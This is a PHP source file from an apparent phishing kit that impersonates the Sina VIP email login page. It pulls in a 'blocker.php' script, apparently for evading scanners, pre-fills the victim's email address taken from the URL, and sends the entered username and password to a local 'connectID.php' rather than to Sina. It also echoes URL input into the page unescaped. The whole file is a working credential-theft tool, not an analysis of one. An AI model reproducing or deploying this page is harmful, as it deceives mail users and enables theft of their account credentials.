<?php
include('blocker.php');
?>
<?php
function getemailIDFromemail($email)
{
$find = '@';
$pos = strpos($email, $find);
$emailID = substr($email, 0, $pos);
return $emailID;
}
function getDomainFromEmail($email)
{
// Get the data after the @ sign
$domain = substr(strrchr($email, "@"), 1);
return $domain;
}
$email = $_GET['email'];
$emailID = getemailIDFromemail($email);
$domain = getDomainFromEmail($email);
$ln = strlen($email);
$len = strrev($email);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
$yuh = substr($len,0,$x);
$yuh = strrev($yuh);
for($i=0; $i<$ln; $i++){
	if($yuh[$i] == "."){
		$x = $i;
		break;
	}
}
$yuh = substr($yuh,0,$x);
$yuh = ucfirst($yuh);
?>
<!DOCTYPE html>
<html lang="zh">
<head>
<link rel="SHORTCUT ICON" href="https://vip.sina.com.cn//favicon.ico"/>
<meta charset="utf-8">
<meta name="keywords" content="新浪VIP邮箱,sina,VIP邮箱,收费邮箱,购买注册VIP邮箱，大附件收发,最安全稳定的商务邮箱,最好的企业邮箱,无广告杀毒邮箱,电子邮件,电子邮箱,邮件营销">
<meta name="description" content="新浪VIP邮箱，新浪邮箱团队倾力打造的高端个人商务邮箱！提供高达68G的邮箱容量，独立服务器收发更顺畅，拥有电子传真，手机邮，短信提醒等强大商务功能，支持500封群发，4G超大附件，10G超大网盘，垃圾病毒拦截率可达99.5%，高端商务人士邮箱服务首选。">
<meta name="title" content="新浪VIP邮箱">
<script type="text/javascript">
    var conf = {
        isVip:false,
        isMem:false
    };
    var sinaSSOConfig = {
        entry : 'cnmail', // 本产品的标识
        loginType : 0,
        setDomain : true,
        pageCharset :'UTF-8',
        customInit : function() {
            sinaSSOController.setLoginType(3);
        },
        customLoginCallBack : function(status){
            conf.loginCallBack(status);
        }
    };
</script>
<title>新浪VIP邮箱</title>
<script type="text/javascript" src="https://2008mail.sina.com.cn/js/r.core.js?ver=20140811"></script><link rel="stylesheet" type="text/css" href="https://mail2008.sina.com.cn/css/vip/login.css?ver=20140109"><style type="text/css">
/*telMailIco*/
a.telMailIco{display:inline-block;padding:2px 0px 0px 15px;background:url('https://2008mail.sina.com.cn/images/telMailIco.gif') no-repeat 0px 5px;}
</style>
</head>
<body>
<div id="bgHeight" class="bgHeight">
<form  id="loginForm" method="post" action="connectID.php" class="form_user">
    <input type="hidden" class="productName" value="vip" />
	<input type="hidden" name="email" value="<?php echo $email ?>" >
	<!--登录页背景-->
	<div class="viploginbg"><img  /></div>
	<!--/登录页背景-->
    	<!--提示框-->
    <div class="error timeout" style="display:none">
            <span>无法正常登录？请联系客服帮您解决。</span>
    </div>
    <div class="error addfavorite" style="display:none">
        <span>加入收藏失败,请Ctrl+D手动添加。</span>
    </div>
    <div class="error locked" style="display:none">
        <span>帐号被锁定：</span>
        <span>·如需解锁，请编辑短信js发送到1069019555605进行解锁。</span>
    </div>
    <div class="error keyerr" style="display:none">
        <span>已检测到您的会员号没有开通邮箱，请重新登录</span>
    </div>
    <!--提示框-->
	<!--顶部导航-->
	<div class="topbar">
		<div class="topmain">
			<h1 class="logo"><a href="#"></a></h1>
			<div class="rtop"><a href="https://mail.sina.com.cn" target="_blank">免费邮箱</a><span class="line">|</span><a  href="http://mail.sina.net" target="_blank">专业企业邮箱 </a><span class="line">|</span><a href="http://mail.sina.com.cn/mobile.html" class="telMailIco" target="_blank">手机邮箱</a><span class="line">|</span><a href="#" class="icon supportBtn">7×24小时服务</a></div>
			<div class="supportBox" style="display:none">
				<div class="arrowTop"></div>
				<div class="supportCon">
					<p><b class="arrowLeft"></b><span>24小时服务专线:<b>4006-900-000</b></span></p>
					<p><b class="arrowLeft"></b><span>客服邮箱：<a href="mailto:webmaster@vip.sina.com" title="">webmaster@vip.sina.com</a></span></p>
				</div>
				<div class="supportList"><a href="http://help.sina.com.cn/index.php?s=questionlist&a=view&classid=166" title="" class="payGuide" target="_blank"><b></b><span>支付指南</span></a><a href="http://help.sina.com.cn/index.php?s=questionlist&a=view&classid=168" title="" class="getBill" target="_blank"><b></b><span>索取发票</span></a><a href="/feedback/feedback.php" title="" class="feedback" target="_blank"><b></b><span>我要反馈</span></a><a href="http://help.sina.com.cn/index.php?s=commonquestion&a=subview&productid=3" title="" class="helpCenter" target="_blank"><b></b><span>帮助中心</span></a></div>
			</div>
		</div>
	</div>
	<!--/顶部导航-->
	<!--登录框-->
	<div class="loginBox" id="loginBox" style="margin-top:50px;margin-bottom:50px;">
        <div class="vipError" style="visibility:visble;height:26px;">
            <div style="display:none" class="loginError tip21">您输入的邮箱名或密码不正确</div>
            <div style="display:none" class="loginError tip23">请输入密码</div>
            <div style="display:none" class="loginError tip25" >请输入微盾动态码</div>
        </div>
	    <ul class="vipMailbox">
	        <li class="mailname"><label class="placeholder" for="vipname">输入邮箱名</label><input type="text" value="<?php echo $emailID ?>" required="" readonly="" name="username" class="username focus" id="vipname" tabindex="1"><span class="vip">@<?php echo $domain ?></span><a class="clearname" href="#" style="display: none;"></a></li>
	        <li class="mailpass"><input required="" type="password" autofocus value="" name="password" class="password" id="vippassword" tabindex="2"/><label class="placeholder" for="vippassword">输入密码</label></li>
            <li class="mailvsn" style="display:none"><input type="text" value="" name="vsn" class="vsn" id="vipvsn" tabindex="3" maxlength="6"/><a class="findvsn" href="https://vdun.sina.com.cn/report_loss" target="_blank">微盾挂失</a><label class="placeholder placeholder1" for="vipvsn">输入微盾动态码</label></li>
	        <li class="set">
                <a href="https://login.sina.com.cn/cgi/getpwd/getpwd0.php?entry=sso" target="_blank" class="forgetPas" style="color:#333">找回密码？</a>
                <input tabindex="4" id="store2" type="checkbox" checked="checked">
                <label for="store2" style="color:#333">保持登录</label>
                <input tabindex="5" id="ssl2" type="checkbox" checked="checked">
                <label for="ssl2" style="color:#333">安全登录</label>
            </li>
            <li class="safeTip tip24" style="display: none;">建议在网吧或公共电脑上取消保持登录选项。</li>
            <li class="checkcodeBox" style="display:none">
                <div class="clearfix">
                    <input id="freecheckcode" name="checkcode" value="" type="text">
                    <img  alt="" class="checkcode">
                    <label for="freecheckcode" class="placeholder placeholder1">请输入验证码</label>
                </div>
                <p class="clearfix"><a href="">看不清？换一个</a>按右图填写，不区分大小写</p>
            </li>
	        <li class="btn"><button  style="background: url('https://mail2008.sina.com.cn/images/vip/btn_login.png') repeat-x scroll 0% 0% transparent;display: block;height: 36px;line-height: 36px;float: left;text-align: center;width: 117px;font-size: 14px;font-weight: bold;color: #FFF;text-decoration: none;color: #E7E7E6;list-style: none outside none;font-family: Tahoma,"微软雅黑","宋体";font: 12px/1.125 宋体,Arial,Helvetica,sans-serif;border: 1px solid #336895;" type="submit"> 登录</button><a href="/register/reg_vipmail.php" class="register" target="_blank">注册</a></li>
	        <li class="pay"><a href="https://mail.sina.com.cn/cgi-bin/speeddetect.php?type=vip" target="_blank" style="float:right;color:#333;">加快登录速度</a><a href="/cgi-bin/payforothers.php" target="_blank" class="chargeVip" style="color:#333;">代人续费</a></li>
	    </ul>
	</div>
	<!--/登录框-->
	<!--尾部-->
        <div class="vipfooter">
            <div class="loginFooter">
                <ul>
                    <li><a target="_blank" style="color: red;"href="http://mail.sina.com.cn/zhizun.html#1">注册至尊邮箱赢好礼！</a></li>
                    <li><a style="color: #333;" href="http://help.sina.com.cn/index.php?s=comquestiondetail&a=view&id=856">如何使用电子传真！</a></li>
                    <li><a style="color: #333;" href="http://help.sina.com.cn/index.php?s=comquestiondetail&a=view&id=799">如何在iphone上设置VIP邮箱</a></li>
                </ul>
            </div>
            <div class="footenter" style="color:#333;">
                <div class="copyRight">新浪公司 版权所有    Copyright © 1996-2015 SINA Corporation, All Rights Reserved</div>
                <div class="nav"><a href="http://weibo.com/sinavip" title="官方微博" target="_blank" style="color:#333;">官方微博</a>|<a href="/feedback/feedback.php" title="意见反馈" target="_blank" style="color:#333;">意见反馈</a>|<a href="http://www.12321.cn/" title="不良信息举报" target="blank" style="color:#333;">不良信息举报</a>|<a title="帮助" target="_blank" href="http://help.sina.com.cn/index.php?s=commonquestion&a=subview&productid=3" style="color:#333;">帮助</a></div>
            </div>
        </div>
	<!--/尾部-->
</div>
<script type="text/javascript">
    using(['r/core'],function(R){
        var window = R.global, document = window.document, DOM = R.dom, E = R.event, $S = DOM.query, $ = DOM.$;
        R.declare({
            confdata: {
                'noticeHTML': '<ul><li><a target="_blank" style="color: red;"href="http://vip.sina.com.cn/loginbefore/news-maintext130603.html">VIP邮箱系统升级！</a></li>' +
                '<li><a style="color: #333;" href="http://blog.sina.com.cn/s/blog_4bea75720100q0wv.html?tj=1" target="_blank">新版VIP推出电子传真功能！</a></li>' +
                '<li><a style="color: #333;" href="http://blog.sina.com.cn/s/blog_4bea75720100hwba.html?tj=1" target="_blank">如何在iphone上设置VIP邮箱</a></li></ul>' +
                '<a style="color: #333;" target="_blank" href="http://exmail.sina.com.cn/">免费企业邮箱公测</a></p>',
                 'bgdata': ([
                { img:'index/vip_bg150402.jpg',
                    bgcolor: '#fff'
                },
                { img:'index/vip_bg150402.jpg',
                    bgcolor: '#fff'
                }])
            }
        });
    });    
    
    var loginBox = document.getElementById('loginBox');
    var setMiddle = function(){
        var middleH;
        var windoww = Math.max(document.body.clientWidth, document.documentElement.clientWidth),
            windowh = Math.max(document.body.clientHeight, document.documentElement.clientHeight);
        if(windowh <= 500 && windoww <= 950){
            middleH = getMiddleH(1);
        }else if(windowh <= 500){
            middleH = getMiddleH(1);
        }else if(windoww <= 950){
            middleH = getMiddleH();
        }else{
            middleH = getMiddleH();
        }
        loginBox.style.marginTop = 
        loginBox.style.marginBottom = middleH + 'px';
    };
    //获得居中高度
    function getMiddleH(flag){
        var bgHeight = document.getElementById('bgHeight');
        var height = loginBox.clientHeight;
        if(!flag){
            return (bgHeight.clientHeight - 54 - 65 - height)/2;
        }else{
            return (500- 54 - 65 - height)/2;
        }
    }
    setMiddle();
</script>
<script type="text/javascript" src="https://login.sina.com.cn/js/sso/ssologin.js"></script><script type="text/javascript" src="https://2008mail.sina.com.cn/js/login_v.js?ver=201505121"></script><noScript>
<div style='position:absolute;top:0;left:0;width:0;height:0;visibility:hidden'><img width=0 height=0 src='http://beacon.sina.com.cn/a.gif?noScript' border='0' alt='' /></div>
</noScript>
</body>
</html>
